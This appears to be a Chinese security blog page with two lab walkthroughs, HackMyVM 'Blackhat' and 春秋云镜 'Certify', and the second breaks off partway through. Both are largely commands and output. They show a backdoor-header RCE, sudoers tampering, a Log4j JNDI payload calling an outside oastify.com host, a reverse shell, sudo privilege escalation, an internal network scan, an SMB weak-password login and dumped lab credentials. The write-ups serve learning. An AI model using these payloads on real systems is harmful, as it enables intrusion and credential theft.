        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/17/Hackmyvm-Blackhat/" class="post-title-link" itemprop="url">HackmyVM-Blackhat</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-04-17 12:14:42 / 修改时间：12:32:31" itemprop="dateCreated datePublished" datetime="2025-04-17T12:14:42+08:00">2025-04-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.6k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>arp-scan -l扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class="line">192.168.31.2    08:00:27:73:b2:7a       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.140  08:00:27:19:a9:32       PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>

<p>192.168.31.140是靶机地址</p>
<p>然后扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.140</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 00:16 EDT</span><br><span class="line">Nmap scan report for 192.168.31.140</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:19:A9:32 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds</span><br></pre></td></tr></table></figure>

<p>只开了一个80端口，扫描一下目录可以扫描到一个phpinfo.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Loaded Modules	core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_backdoor mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status</span><br></pre></td></tr></table></figure>

<p>mod_backdoor 存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# curl 192.168.31.140 -H &quot;Backdoor: id&quot;</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<p>反弹一个shell出来，上传 linpeas.sh ，运行看结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Files with ACLs (limited to 50)</span><br><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls</span><br><span class="line"># file: /etc/sudoers</span><br><span class="line">USER   root       r--</span><br><span class="line">user   darkdante  rw-</span><br><span class="line">GROUP  root       r--</span><br><span class="line">mask              rw-</span><br><span class="line">other             ---</span><br></pre></td></tr></table></figure>

<p>可以看到sudoers文件darkdante有写的权限，darkdante直接su就登录了哈哈哈哈哈</p>
<p>写入sudoers文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">darkdante ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>

<p>然后sudo su，提权成功</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="lvzhouhang">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | lvzhouhang">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify/" class="post-title-link" itemprop="url">春秋云镜-Certify</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-16 23:55:55" itemprop="dateCreated datePublished" datetime="2025-04-16T23:55:55+08:00">2025-04-16</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-04-17 13:22:02" itemprop="dateModified" datetime="2025-04-17T13:22:02+08:00">2025-04-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" itemprop="url" rel="index"><span itemprop="name">春秋云镜</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>23k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>21 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="FLAG1"><a href="#FLAG1" class="headerlink" title="FLAG1"></a>FLAG1</h1><p>先用fscan扫一扫</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ../pentest/fscan/fscan2 -h 39.99.135.211</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-16 11:59:40] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-16 11:59:40] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-16 11:59:40] [INFO] 最终有效主机数量: 1</span><br><span class="line">[2025-04-16 11:59:41] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-16 11:59:41] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-16 11:59:41] [SUCCESS] 端口开放 39.99.135.211:22</span><br><span class="line">[2025-04-16 11:59:41] [SUCCESS] 端口开放 39.99.135.211:80</span><br><span class="line">[2025-04-16 11:59:41] [SUCCESS] 服务识别 39.99.135.211:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-16 11:59:45] [SUCCESS] 端口开放 39.99.135.211:8983</span><br><span class="line">[2025-04-16 11:59:46] [SUCCESS] 服务识别 39.99.135.211:80 =&gt; [http] 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu</span><br><span class="line">[2025-04-16 11:59:55] [SUCCESS] 服务识别 39.99.135.211:8983 =&gt; [http] 产品:Apache Solr Banner:[HTTP/1.1 302 Found.Location: http://172.22.9.19:8983/solr/.]</span><br><span class="line">[2025-04-16 11:59:55] [INFO] 存活端口数量: 3</span><br><span class="line">[2025-04-16 11:59:55] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-16 11:59:55] [INFO] 加载的插件: ssh, webpoc, webtitle</span><br><span class="line">[2025-04-16 11:59:55] [SUCCESS] 网站标题 http://39.99.135.211      状态码:200 长度:612    标题:Welcome to nginx!</span><br><span class="line">[2025-04-16 11:59:56] [SUCCESS] 网站标题 http://39.99.135.211:8983 状态码:302 长度:0      标题:无标题 重定向地址: http://39.99.135.211:8983/solr/</span><br><span class="line">[2025-04-16 11:59:57] [SUCCESS] 网站标题 http://39.99.135.211:8983/solr/ 状态码:200 长度:16555  标题:Solr Admin</span><br><span class="line">[2025-04-16 12:00:04] [SUCCESS] 扫描已完成: 5/5</span><br></pre></td></tr></table></figure>

<p>39.99.135.211:8983是一个solr面板，存在log4j漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.99.135.211:8983/solr/admin/cores?action=$&#123;jndi:ldap://tc94uide908k5qcv0xurpcoorfx6lw9l.oastify.com&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify1.png"></p>
<p>上vps，可以利用<a target="_blank" rel="noopener" href="https://github.com/vulhub/java-chains">java-chains</a>反弹一个shell,反弹的shell如果不舒服可以写一个公钥进去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">solr@ubuntu:/opt/solr$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for solr on ubuntu:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User solr may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/gr</span><br></pre></td></tr></table></figure>

<p>提权<code>sudo grc --pty /bin/sh</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">solr@ubuntu:~$ sudo grc --pty /bin/sh</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p>提权到root后，写一个公钥进去，flag01在/root/flag下，然后上传一个fscan，再做一个代理</p>
<h1 id="FLAG2"><a href="#FLAG2" class="headerlink" title="FLAG2"></a>FLAG2</h1><p>查看一下内网的ip端，开扫！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:16:3e:26:2b:c3 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.22.9.19/16 brd 172.22.255.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 315357456sec preferred_lft 315357456sec</span><br><span class="line">    inet6 fe80::216:3eff:fe26:2bc3/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# ./fscan2 -h 172.22.9.19/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-17 00:40:03] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-17 00:40:03] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-17 00:40:03] [INFO] CIDR范围: 172.22.9.0-172.22.9.255</span><br><span class="line">[2025-04-17 00:40:03] [INFO] 生成IP范围: 172.22.9.0.%!d(string=172.22.9.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-04-17 00:40:03] [INFO] 解析CIDR 172.22.9.19/24 -&gt; IP范围 172.22.9.0-172.22.9.255</span><br><span class="line">[2025-04-17 00:40:03] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-17 00:40:03] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.19     存活 (ICMP)</span><br><span class="line">[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.7      存活 (ICMP)</span><br><span class="line">[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.26     存活 (ICMP)</span><br><span class="line">[2025-04-17 00:40:03] [SUCCESS] 目标 172.22.9.47     存活 (ICMP)</span><br><span class="line">[2025-04-17 00:40:06] [INFO] 存活主机数量: 4</span><br><span class="line">[2025-04-17 00:40:06] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:88</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:80</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:80</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:22</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.19:80</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:21</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.19:22</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:445</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:445</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:445</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:389</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.47:139</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:139</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:139</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.7:135</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 端口开放 172.22.9.26:135</span><br><span class="line">[2025-04-17 00:40:06] [SUCCESS] 服务识别 172.22.9.47:22 =&gt; [ssh] 版本:7.6p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7.]</span><br><span class="line">[2025-04-17 00:40:07] [SUCCESS] 服务识别 172.22.9.47:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]</span><br><span class="line">[2025-04-17 00:40:07] [SUCCESS] 服务识别 172.22.9.19:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-17 00:40:11] [SUCCESS] 服务识别 172.22.9.7:88 =&gt;</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.19:80 =&gt; [http] 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.26:445 =&gt;</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:80 =&gt; [http]</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:445 =&gt;</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:389 =&gt;</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.7:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.26:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-17 00:40:12] [SUCCESS] 服务识别 172.22.9.47:80 =&gt; [http]</span><br><span class="line">[2025-04-17 00:41:07] [SUCCESS] 服务识别 172.22.9.47:445 =&gt;</span><br><span class="line">[2025-04-17 00:41:07] [SUCCESS] 服务识别 172.22.9.47:139 =&gt;</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] 服务识别 172.22.9.7:135 =&gt;</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] 服务识别 172.22.9.26:135 =&gt;</span><br><span class="line">[2025-04-17 00:41:12] [INFO] 存活端口数量: 16</span><br><span class="line">[2025-04-17 00:41:12] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-17 00:41:12] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.19        状态码:200 长度:612    标题:Welcome to nginx!</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.9.26</span><br><span class="line">主机名: DESKTOP-CBKTVMO</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.9.26</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.47        状态码:200 长度:10918  标题:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] 网站标题 http://172.22.9.7         状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.7      DC:XIAORANG\XIAORANG-DC</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.9.7</span><br><span class="line">主机名: XIAORANG-DC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.9.7</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] SMB认证成功 172.22.9.47:445 administrator:123456</span><br><span class="line">[2025-04-17 00:41:12] [INFO] 系统信息 172.22.9.47 [Windows 6.1]</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.47     fileserver                          Windows 6.1</span><br><span class="line">[2025-04-17 00:41:12] [INFO] SMB2共享信息 172.22.9.47:445 administrator Pass:123456 共享:[print$ fileshare IPC$]</span><br><span class="line">[2025-04-17 00:41:12] [SUCCESS] 目标: http://172.22.9.7:80</span><br><span class="line">  漏洞类型: poc-yaml-active-directory-certsrv-detect</span><br><span class="line">  漏洞名称:</span><br><span class="line">  详细信息:</span><br><span class="line">        author:AgeloVito</span><br><span class="line">        links:https://www.cnblogs.com/EasonJim/p/6859345.html</span><br></pre></td></tr></table></figure>

<p>上来就扫到域控的漏洞了，但是现在还没有什么可用的信息没办法直接打。</p>
<p>172.22.9.47:445 smb服务存在一个弱口令登陆一下看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# smbclient //172.22.9.47/fileshare -U administrator%123465</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Wed Jul 13 04:12:10 2022</span><br><span class="line">  ..                                  D        0  Wed Jul 13 00:35:09 2022</span><br><span class="line">  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022</span><br><span class="line">  secret                              D        0  Wed Apr 16 11:57:06 2025</span><br><span class="line">  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022</span><br><span class="line">  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022</span><br><span class="line"></span><br><span class="line">                41152812 blocks of size 1024. 36033208 blocks available</span><br><span class="line">smb: \&gt; cd ..</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Wed Jul 13 04:12:10 2022</span><br><span class="line">  ..                                  D        0  Wed Jul 13 00:35:09 2022</span><br><span class="line">  personnel.db                        A    61440  Wed Jul 13 03:46:55 2022</span><br><span class="line">  secret                              D        0  Wed Apr 16 11:57:06 2025</span><br><span class="line">  Certified_Pre-Owned.7z              N  9572925  Wed Jul 13 04:12:03 2022</span><br><span class="line">  Certified_Pre-Owned.pdf             N 10406101  Wed Jul 13 04:08:14 2022</span><br><span class="line"></span><br><span class="line">                41152812 blocks of size 1024. 36033208 blocks available</span><br><span class="line">smb: \&gt; cd secret</span><br><span class="line">smb: \secret\&gt; ls</span><br><span class="line">  .                                   D        0  Wed Apr 16 11:57:06 2025</span><br><span class="line">  ..                                  D        0  Wed Jul 13 04:12:10 2022</span><br><span class="line">  flag02.txt                          N      659  Wed Apr 16 11:57:06 2025</span><br><span class="line"></span><br><span class="line">                41152812 blocks of size 1024. 36033208 blocks available</span><br></pre></td></tr></table></figure>

<p>找到flag02了</p>
<h1 id="FLAG3-amp-FLAG4"><a href="#FLAG3-amp-FLAG4" class="headerlink" title="FLAG3&amp;FLAG4"></a>FLAG3&amp;FLAG4</h1><p>flag02.txt里还给了一个提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yes, you have enumerated smb. But do you know what an SPN is?</span><br></pre></td></tr></table></figure>

<p>把所有文件都下载下来看一看,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; select * from xr_users ;</span><br><span class="line">1|admin|admin</span><br><span class="line">2|******|i9XDE02pLVf</span><br><span class="line">3|******|6N70jt2K9sV</span><br><span class="line">4|******|fiAzGwEMgTY</span><br><span class="line">sqlite&gt; select * from xr_members ;</span><br><span class="line">1|huangmin|1|26|15220647319|huangmin@xiaorang.lab</span><br><span class="line">2|zhangrong|1|36|13073815024|zhangrong@xiaorang.lab</span><br><span 